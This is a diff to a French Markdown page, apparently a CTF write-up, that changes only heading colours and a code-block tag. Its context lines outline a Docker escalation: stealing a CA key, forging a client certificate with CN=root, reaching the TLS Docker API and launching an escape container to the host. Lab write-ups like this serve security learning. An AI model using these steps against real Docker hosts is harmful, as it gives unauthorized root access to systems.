@@ -10,7 +10,7 @@ Docker peut être configuré pour exposer son API sur un port TCP avec authentif
 
 ***
 
-### Prérequis
+### <mark style="color:blue;">Prérequis</mark>
 
 * Accès en lecture aux fichiers de certificats Docker (CA key incluse)
 * Docker API accessible (ex : `127.0.0.1:2376`)
@@ -20,7 +20,7 @@ Docker peut être configuré pour exposer son API sur un port TCP avec authentif
 
 ### <mark style="color:blue;">Architecture ciblée</mark>
 
-```
+```shellscript
 dockerd \
   --tlsverify \
   --tlscacert=/etc/docker/certs/ca.pem \
@@ -38,9 +38,9 @@ dockerd \
 
 ***
 
-### Étapes d'exploitation
+### <mark style="color:blue;">Étapes d'exploitation</mark>
 
-#### 1. Récupérer les certificats CA
+#### <mark style="color:green;">1. Récupérer les certificats CA</mark>
 
 ```bash
 ls -la /srv/web.fries.htb/certs/
@@ -56,7 +56,7 @@ cp /srv/web.fries.htb/certs/ca-key.pem /tmp/work/
 
 ***
 
-#### 2. Générer une clé privée client
+#### <mark style="color:green;">2. Générer une clé privée client</mark>
 
 ```bash
 openssl genrsa -out client-key.pem 2048
@@ -64,7 +64,7 @@ openssl genrsa -out client-key.pem 2048
 
 ***
 
-#### 3. Créer une CSR avec `CN=root`
+#### <mark style="color:green;">3. Créer une CSR avec</mark> <mark style="color:green;"></mark><mark style="color:green;">`CN=root`</mark>
 
 ```bash
 openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
@@ -74,7 +74,7 @@ openssl req -new -key client-key.pem -out client.csr -subj "/CN=root"
 
 ***
 
-#### 4. Configurer les extensions
+#### <mark style="color:green;">4. Configurer les extensions</mark>
 
 ```bash
 echo "extendedKeyUsage = clientAuth" > ext.cnf
@@ -82,7 +82,7 @@ echo "extendedKeyUsage = clientAuth" > ext.cnf
 
 ***
 
-#### 5. Signer le certificat avec la CA volée
+#### <mark style="color:green;">5. Signer le certificat avec la CA volée</mark>
 
 ```bash
 openssl x509 -req \
@@ -99,7 +99,7 @@ Le certificat résultant est signé par la vraie CA → Docker lui fait confianc
 
 ***
 
-#### 6. Se connecter à l'API Docker
+#### <mark style="color:green;">6. Se connecter à l'API Docker</mark>
 
 ```bash
 docker --tlsverify \
@@ -114,7 +114,7 @@ Si la commande retourne la liste des conteneurs, l'accès est confirmé.
 
 ***
 
-#### 7. Lancer un conteneur d'évasion
+#### <mark style="color:green;">7. Lancer un conteneur d'évasion</mark>
 
 ```bash
 docker --tlsverify \
@@ -132,7 +132,7 @@ docker --tlsverify \
 
 ***
 
-#### 8. S'échapper vers le système hôte
+#### <mark style="color:green;">8. S'échapper vers le système hôte</mark>
 
 Une fois dans le conteneur :
 
